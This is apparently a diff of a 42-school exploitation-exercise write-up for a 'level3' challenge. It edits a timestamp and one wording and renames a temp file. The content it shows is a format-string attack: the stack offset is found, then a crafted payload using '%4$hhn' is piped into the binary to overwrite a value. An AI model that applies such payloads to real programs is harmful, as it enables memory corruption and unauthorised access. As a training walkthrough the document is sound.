@@ -6,7 +6,7 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:51:42 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/06 03:50:09 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/06 05:31:46 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -31,8 +31,8 @@ Get the offset of the format string in the stack
 ---------------------------------- 0x200 0xb7fd1ac0 0xb7ff37d0 0x2d2d2d2d [...]
 The value is 4
 
-Write the pointer to the stack, write the amount of chars needed for the correct value
-Then write the value using %n
+Write the pointer to the stack, write the amount of chars needed for the correct value,
+then write the value using %n
 
-echo -e -n "\x8c\x98\x04\x08%60d%4\$hhn" > /tmp/t
-cat /tmp/t - | ./level3
+echo -e -n "\x8c\x98\x04\x08%60d%4\$hhn" > /tmp/l3
+cat /tmp/l3 - | ./level3
